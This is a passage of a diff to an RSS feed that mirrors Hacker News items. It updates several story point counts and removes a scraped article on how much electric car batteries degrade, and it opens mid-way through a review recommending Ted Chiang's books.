year, I recommend reading </span><em>Stories of Your Life</em><span>. If you could only read 2 science fiction books this year, I recommend reading both </span><em>Stories of Your Life</em><span> and </span><em>Exhalation</em><span>.</span></p><figure data-drag-handle="true" data-component-name="ImageGallery"><div><div><picture><source type="image/webp" srcset="https://substackcdn.com/image/fetch/$s_!l_KA!,w_424,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F4a03822c-fe6c-4013-876c-46f0b77ca3b5_778x1200.jpeg 424w, https://substackcdn.com/image/fetch/$s_!l_KA!,w_720,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F4a03822c-fe6c-4013-876c-46f0b77ca3b5_778x1200.jpeg 720w" sizes="100vw"><img src="https://substackcdn.com/image/fetch/$s_!l_KA!,w_720,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F4a03822c-fe6c-4013-876c-46f0b77ca3b5_778x1200.jpeg" sizes="100vw" alt="" srcset="https://substackcdn.com/image/fetch/$s_!l_KA!,w_424,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F4a03822c-fe6c-4013-876c-46f0b77ca3b5_778x1200.jpeg 424w, https://substackcdn.com/image/fetch/$s_!l_KA!,w_720,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F4a03822c-fe6c-4013-876c-46f0b77ca3b5_778x1200.jpeg 720w" width="720"></picture><picture><source type="image/webp" srcset="https://substackcdn.com/image/fetch/$s_!g7N-!,w_424,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F35666649-5888-4d16-8a61-65d72db60197_973x1500.jpeg 424w, https://substackcdn.com/image/fetch/$s_!g7N-!,w_720,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F35666649-5888-4d16-8a61-65d72db60197_973x1500.jpeg 720w" sizes="100vw"><img src="https://substackcdn.com/image/fetch/$s_!g7N-!,w_720,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F35666649-5888-4d16-8a61-65d72db60197_973x1500.jpeg" sizes="100vw" alt="" srcset="https://substackcdn.com/image/fetch/$s_!g7N-!,w_424,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F35666649-5888-4d16-8a61-65d72db60197_973x1500.jpeg 424w, https://substackcdn.com/image/fetch/$s_!g7N-!,w_720,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F35666649-5888-4d16-8a61-65d72db60197_973x1500.jpeg 720w" width="720"></picture></div><figcaption>https://www.amazon.com/Stories-Your-Life-Others-Chiang/dp/1101972122  https://www.amazon.com/Exhalation-Ted-Chiang/dp/1101972084/ </figcaption></div></figure><p><a href="https://www.amazon.com/Stories-Your-Life-Others-Chiang/dp/1101972122" rel="">Story Of Your Life</a><span>//</span><a href="https://www.amazon.com/Exhalation-Ted-Chiang/dp/1101972084/" rel="">Exhalation</a></p><p><span>And if you are planning to read 5 science fiction books this year, congrats on making the time for it! In that case I recommend you read </span><em>Story of Your Life</em><span> twice and </span><em>Exhalation</em><span> three times.</span></p><p data-attrs="{&quot;url&quot;:&quot;https://linch.substack.com/p/ted-chiang-review?utm_source=substack&amp;utm_medium=email&amp;utm_content=share&amp;action=share&quot;,&quot;text&quot;:&quot;Share&quot;,&quot;action&quot;:null,&quot;class&quot;:null}" data-component-name="ButtonCreateButton"><a href="https://linch.substack.com/p/ted-chiang-review?utm_source=substack&amp;utm_medium=email&amp;utm_content=share&amp;action=share" rel=""><span>Share</span></a></p><ol><li><p><strong>Berkeley/SF Bay Area readers:</strong><span> We're hosting an in-person screening of </span><em>Arrival</em><span> (based on "Story of Your Life") on August 25th! Still have spots. Please comment or DM for an invite.</span></p></li><li><p><strong>Coming soon:</strong><span> I'm planning to add paid subscriptions for unfinished drafts, research notes, and so people can show general support. Nothing important will be paywalled. Thoughts welcome!</span></p></li><li><p><strong>Thank you:</strong><span> We've hit 200+ subscribers in 1.5 months! I'd love your feedback on topics you'd like to see or how I can improve.</span></p></li></ol></div></article></div><div id="discussion"><h4>Discussion about this post</h4></div></div>]]></description>
         </item>
         <item>
-            <title><![CDATA[Croatian freediver held breath for 29 minutes (266 pts)]]></title>
+            <title><![CDATA[Croatian freediver held breath for 29 minutes (269 pts)]]></title>
             <link>https://divernet.com/scuba-news/freediving/how-croatian-freediver-held-breath-for-29-minutes/</link>
             <guid>44946762</guid>
             <pubDate>Tue, 19 Aug 2025 00:04:11 GMT</pubDate>
@@ -2055,7 +2964,7 @@ There may be patents and / or laws prohibiting you of doing so.</p>
 				</div></div>]]></description>
         </item>
         <item>
-            <title><![CDATA[What could have been (141 pts)]]></title>
+            <title><![CDATA[What could have been (142 pts)]]></title>
             <link>https://coppolaemilio.com/entries/what-could-have-been/</link>
             <guid>44945966</guid>
             <pubDate>Mon, 18 Aug 2025 22:29:44 GMT</pubDate>
@@ -2120,7 +3029,7 @@ Your gamescom team</p>
 Couldn't get https://www.smithsonianmag.com/smart-news/lab-grown-salmon-hits-the-menu-at-an-oregon-restaurant-as-the-fda-greenlights-the-cell-cultured-product-180986769/: Error: Request failed with status code 403]]></description>
         </item>
         <item>
-            <title><![CDATA[Shamelessness as a strategy (2019) (208 pts)]]></title>
+            <title><![CDATA[Shamelessness as a strategy (2019) (210 pts)]]></title>
             <link>https://nadia.xyz/shameless</link>
             <guid>44945943</guid>
             <pubDate>Mon, 18 Aug 2025 22:27:01 GMT</pubDate>
@@ -2163,7 +3072,7 @@ Couldn't get https://www.smithsonianmag.com/smart-news/lab-grown-salmon-hits-the
     </div></div>]]></description>
         </item>
         <item>
-            <title><![CDATA[Newsmax agrees to pay $67M in defamation case over bogus 2020 election claims (188 pts)]]></title>
+            <title><![CDATA[Newsmax agrees to pay $67M in defamation case over bogus 2020 election claims (190 pts)]]></title>
             <link>https://apnews.com/article/dominion-voting-newsmax-defamation-trump-2020-3b2366dfdae3a8432afe822bf14fe1ef</link>
             <guid>44945925</guid>
             <pubDate>Mon, 18 Aug 2025 22:23:37 GMT</pubDate>
@@ -2189,7 +3098,7 @@ Couldn't get https://www.smithsonianmag.com/smart-news/lab-grown-salmon-hits-the
                                     </div></div>]]></description>
         </item>
         <item>
-            <title><![CDATA[Phrack 72 (151 pts)]]></title>
+            <title><![CDATA[Phrack 72 (153 pts)]]></title>
             <link>https://phrack.org/issues/72/1</link>
             <guid>44945660</guid>
             <pubDate>Mon, 18 Aug 2025 21:43:22 GMT</pubDate>
@@ -2583,7 +3492,7 @@ Summer 2026
 </div></div>]]></description>
         </item>
         <item>
-            <title><![CDATA[Obsidian Bases (638 pts)]]></title>
+            <title><![CDATA[Obsidian Bases (644 pts)]]></title>
             <link>https://help.obsidian.md/bases</link>
             <guid>44945532</guid>
             <pubDate>Mon, 18 Aug 2025 21:28:05 GMT</pubDate>
@@ -2591,7 +3500,7 @@ Summer 2026
 &lt;Unparsable&gt;]]></description>
         </item>
         <item>
-            <title><![CDATA[Show HN: Fractional jobs – part-time roles for engineers (245 pts)]]></title>
+            <title><![CDATA[Show HN: Fractional jobs – part-time roles for engineers (248 pts)]]></title>
             <link>https://www.fractionaljobs.io</link>
             <guid>44945379</guid>
             <pubDate>Mon, 18 Aug 2025 21:10:39 GMT</pubDate>
@@ -3337,14 +4246,6 @@ endmodule
             <pubDate>Mon, 18 Aug 2025 18:51:23 GMT</pubDate>
             <description><![CDATA[<p>URL: <a href="https://www.youtube.com/watch?v=sRPnX_f2V_c">https://www.youtube.com/watch?v=sRPnX_f2V_c</a>, See on <a href="https://news.ycombinator.com/item?id=44943986">Hacker News</a></p>
 &lt;Unparsable&gt;]]></description>
-        </item>
-        <item>
-            <title><![CDATA[How much do electric car batteries degrade? (121 pts)]]></title>
-            <link>https://www.sustainabilitybynumbers.com/p/electric-car-battery-degradation</link>
-            <guid>44943420</guid>
-            <pubDate>Mon, 18 Aug 2025 17:53:20 GMT</pubDate>
-            <description><![CDATA[<p>URL: <a href="https://www.sustainabilitybynumbers.com/p/electric-car-battery-degradation">https://www.sustainabilitybynumbers.com/p/electric-car-battery-degradation</a>, See on <a href="https://news.ycombinator.com/item?id=44943420">Hacker News</a></p>
-<div id="readability-page-1" class="page"><div dir="auto"><p>It’s always the battery in my mobile phone that gives up on me first. After just a few years, it can barely make it through the day without getting another charge.</p><p>Most electric cars have the same types of batteries — usually lithium-ion — so the assumption is that they degrade just as quickly. This is a fairly common fear for people considering a new EV: “Won’t the battery need to be replaced after a few years?”. And I think it’s even more prominent in the second-hand market: “Oh, I’d never buy a second-hand battery!”.</p><p>But the types and structures of electric car and mobile phone batteries are not the same. Car batteries are designed to last far longer.</p><p><span>A few months ago, I </span><a href="https://www.sustainabilitybynumbers.com/p/used-electric-car-costs" rel="">wrote about</a><span> the fact that the electric versions of many cars were now cheaper than their petrol equivalents in the second-hand market. Most of the responses to that article suggested that battery degradation is the reason why. But looking at the data, I’d say that it’s more likely to be the </span><em>perception</em><span> of battery degradation that pushes the value down, not the actual degradation in reality. Pessimism about battery longevity is giving us all cheaper second-hand EVs, which is a nice perk for now, but not great if we want to see a widespread shift from petrol to electric. This is not the </span><em>only</em><span> reason I think used EVs are now undercutting the price of petrol cars; the fact that so many newer (and better) models are coming on the market means that many models — even just a few years old — lose some of their comparative value. Again, I think this is a pretty good thing (at least if you’re a prospective buyer).</span></p><p>Anyway, let’s take a look at battery degradation: why it happens, how much EV batteries degrade, and how to reduce it.</p><p>Two types of degradation happen in an electric car battery:</p><p><span>First, </span><strong>calendar aging</strong><span>, which is when the battery loses capacity over time, even when the car isn’t being used. So if you were to have an electric car, and not touch it for a year, the battery would still experience small amounts of degradation.</span></p><p>Why does this happen? Lithium-ion batteries have a thin layer called the SEI (Solid Electrolyte Interphase) that forms on the anode surface. This slowly grows thicker over time, and as it thickens, it uses lithium and reduces usable capacity. Calendar aging tends to be small — typically around 1% to 2% per year — but can be higher in very hot climates.</p><p><span>Second, we have </span><strong>cyclical aging</strong><span>, which is the degradation that happens when batteries charge and discharge. Every time a battery recharges or discharges, lithium ions move in and out of the electrodes. The mechanical stress of this process gradually creates structural changes in the electrodes, which reduce their capacity. This charge cycling can also grow the SEI layer (which I mentioned above), reducing usable capacity.</span></p><p><span>Before we quantify </span><em>how big</em><span> this effect is, it’s interesting to look at how these processes work over the life of a battery. In the chart below, you can see battery retention measured across a large cohort of Teslas up to 200,000 miles (that’s already telling us something about how big the effect is).</span></p><p>But what’s interesting is that degradation tends to happen quickest in the first 20,000 miles or so. This is because initial lithium salts react with other materials and start building that SEI layer we discussed earlier. After this initial drop, degradation is fairly slow and linear.</p><p>Of course, this fact might be one of the explanations why even fairly low-mileage electric cars quickly lose a lot of value once they’ve been driven. As soon as you get on the road, you’re entering the steepest part of the decline.</p><p>What’s missing, though, is the context that the overall drop in capacity is still small — probably around 3% to 5% within 25,000 miles — and degradation won’t continue at this rate. So if you buy a second-hand electric car that’s done 20,000 miles, it’s not going to degrade at the same pace that it was.</p><p>We’ve now had enough electric cars on the road - and for long enough - to have a good idea of how the battery holds up over time.</p><p>Here we’ll focus on a metric used to capture the battery’s “State of Health” (SoH). It’s what percentage of a battery’s initial capacity is still usable after a given number of miles or years.</p><p>Let’s start with the results of the huge Tesla cohort that we looked at above. In its 2023 Impact Report, Tesla reported that after 200,000 miles of use, the batteries in a Model 3 and Model Y had lost just 15% of their capacity, on average. For the Model S and X, it was just 12%.</p><p>That’s not bad, given that most cars are scrapped somewhere in the 150,000 to 200,000 miles range. At that point, a Tesla will have more than 80% of its initial capacity, and in some cases, even more. So people will probably give up their car, well, well before the battery gets close to becoming a burden.</p><p>What about other car models?</p><p><span>The very early Nissan LEAFs — one of the first electric cars to break through — did have real degradation problems, especially in hotter climates. They used a </span><em>passive</em><span> thermal management system — in other words, there was no </span><em>active</em><span> cooling of the battery — which led to faster degradation. Many of these batteries would need to be replaced.</span><span><a data-component-name="FootnoteAnchorToDOM" id="footnote-anchor-1-171243707" href="https://www.sustainabilitybynumbers.com/p/electric-car-battery-degradation#footnote-1-171243707" target="_self" rel="">1</a></span></p><p>But the early Nissan LEAFs were a vital lesson. Most manufacturers do not experience the same issues today. Manufacturers such as Tesla, GM, Kia and Volkswagen using liquid cooling systems to prevent this. </p><p><span>A large study of 7,000 cars </span><a href="https://www.p3-group.com/en/p3-updates/battery-aging-in-practice/" rel="">by AVILOO</a><span> — some of which had done as much as 300,000 kilometres (almost 200,000 miles) — found that the majority still had more than 80% of battery capacity, even at these high-mileage levels.</span></p><p><span>In </span><a href="https://www.recurrentauto.com/research/lessons-in-electric-car-battery-health" rel="">another study</a><span> across 15,000 cars — which had collectively clocked up 250 million miles — just 1.5% had needed a battery replacement </span><em>for any reason</em><span>, so the share that needed one due to degradation was probably even lower.</span></p><p>I would expect that many cars with far more than 200,000 miles would still have a fairly healthy battery left. But not many cars get to this driving distance, and I’d be a bit cautious about survivorship bias if we had a very small sample size. This is also something to be aware of, even when talking about 200,000-mile vehicles, although here the sample sizes are not that small.</p><p>When looking at degradation rates, I’d recommend looking at real-world data rather than some of the earlier models.</p><p>A common model — the P3 SoH — tends to overestimate degradation rates and is, therefore, too pessimistic about how long EV batteries last. It’s based on battery cell data generated from laboratory tests (without a battery management system), but these tend not to be a great match for real driving conditions.</p><p>In the chart, you can see the P3 SoH predicted line in red, and the Aviloo trend line - based on real car data - in blue. Some cars do degrade as quickly as the P3 model would suggest after 200,000+ miles, but these tend to be the poorer-performing outliers, rather than the typical experience.</p><p><span>A </span><a href="https://www.nature.com/articles/s41560-024-01675-8" rel="">study published</a><span> in </span><em>Nature Energy</em><span> also found that under “real” driving conditions, batteries lasted around 38% longer compared to laboratory tests.</span><span><a data-component-name="FootnoteAnchorToDOM" id="footnote-anchor-2-171243707" href="https://www.sustainabilitybynumbers.com/p/electric-car-battery-degradation#footnote-2-171243707" target="_self" rel="">2</a></span></p><p>If you want to understand car batteries, we now have more than enough data from actual drivers and experiences on the road. Just look at that.</p><p><span>The final reason to have confidence in the performance of batteries over time is that manufacturers clearly have confidence. Most now offer battery warranties: if your battery degrades more than this within a given mileage or timescale, then they’ll repair or replace it for you.</span><span><a data-component-name="FootnoteAnchorToDOM" id="footnote-anchor-3-171243707" href="https://www.sustainabilitybynumbers.com/p/electric-car-battery-degradation#footnote-3-171243707" target="_self" rel="">3</a></span></p><p><span>Most manufacturers offer a warranty somewhere in the range of 8 to 10 years, and 100,000 miles. That usually means that if your battery is below 70% health within </span><em>either</em><span> 8 years or 100,000 miles, they’ll replace it for you.</span></p><p>Some are going even further. Some Mercedes models offer over 150,000 miles and 10 years. The Lexus UX300e offers over 600,000 miles. They clearly have a huge amount of confidence that by the end of your car’s life (which is going to be at far less than 600,000 miles), the battery will still have well over 70% of capacity.</p><p><span>The point is </span><em>not</em><span> that battery degradation is not an issue at all. Knowing that your car’s capacity could drop by 10% to 20% over its lifetime is important and useful to know. I said the same </span><a href="https://www.sustainabilitybynumbers.com/p/electric-cars-cold" rel="">in my article</a><span> on how a car’s range changes in cold temperatures: they do lose a bit and I think it’s important for buyers and drivers to know that up-front. The point is that for most drivers, it’s not a dealbreaker. Most are going to manage fine, even with this drop.</span></p><p>But it’s also important to know what things we can do to protect the battery, and slow this degradation as much as possible. Some of these things will not be new to most of you. But here’s a relatively uncontroversial list of things that are recommended:</p><ul><li><p><strong>Avoid extremely high or low temperatures</strong><span>. This tends to increase both cyclical and calendar aging. Try to keep it out of direct heat if you can. If you can find a model with a heat pump, this is useful to reduce degradation from cold charging.</span></p></li><li><p><strong>Avoid extreme “state-of-charge”</strong><span>. Leaving the battery sitting with more than 80% or less than 10% of charge can accelerate calendar aging.</span></p></li><li><p><strong>Don’t fast charge all the time</strong><span>. Fast charging can increase degradation rates, so only use it when necessary. There are examples of EVs in taxi fleets — which relied heavily on fast-charging — where batteries needed to be replaced.</span></p></li></ul><p>Finally, it’s worth noting that battery designs and chemistries are getting better every day. From here on out, this is as bad as things are going to get. The longevity of the batteries that went into cars a decade ago — and are now reaching 200,000 miles or the end of their lives — is worse than that of the ones going into cars today.</p><p>As I’ve previously said about the emissions associated with an electric car, things are only going to get better.</p></div></div>]]></description>
         </item>
     </channel>
 </rss>
